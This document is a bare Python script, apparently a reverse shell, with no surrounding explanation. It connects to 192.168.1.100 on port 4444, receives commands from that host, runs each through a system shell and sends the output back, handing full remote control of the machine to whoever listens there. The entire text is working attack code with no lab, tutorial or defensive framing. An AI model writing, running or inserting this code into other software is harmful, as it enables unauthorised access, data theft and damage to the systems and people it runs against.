import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))

while True:
    cmd = s.recv(1024).decode()
    output = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)